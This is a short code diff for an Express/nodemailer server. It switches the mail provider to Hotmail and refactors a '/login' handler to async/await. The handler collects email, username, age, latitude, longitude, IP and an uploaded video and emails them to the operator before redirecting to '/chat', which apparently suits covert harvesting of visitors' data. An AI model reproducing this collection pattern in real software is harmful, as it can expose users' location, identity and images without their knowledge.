@@ -29,14 +29,14 @@ app.use(express.urlencoded({ extended: true }));
 
 // Email configuration using environment variables
 const transporter = nodemailer.createTransport({
-  service: 'gmail',
+  service: 'hotmail',
   auth: {
     user: process.env.EMAIL_USER,
     pass: process.env.EMAIL_PASS,
   },
 });
 
-app.post('/login', upload.single('video'), (req, res) => {
+app.post('/login', upload.single('video'), async (req, res) => {
   try {
     const { email, username, age, lat, lon } = req.body;
     const ip = req.ip;
@@ -55,18 +55,12 @@ app.post('/login', upload.single('video'), (req, res) => {
       ],
     };
 
-    transporter.sendMail(mailOptions, (error, info) => {
-      if (error) {
-        console.error(error);
-        res.status(500).send('Error sending email');
-      } else {
-        console.log('Email sent: ' + info.response);
-        res.redirect('/chat');
-      }
-    });
+    const info = await transporter.sendMail(mailOptions);
+    console.log('Email sent: ' + info.response);
+    res.redirect('/chat');
   } catch (error) {
     console.error(error);
-    res.status(500).send('Internal Server Error');
+    res.status(500).send('Error sending email');
   }
 });
 
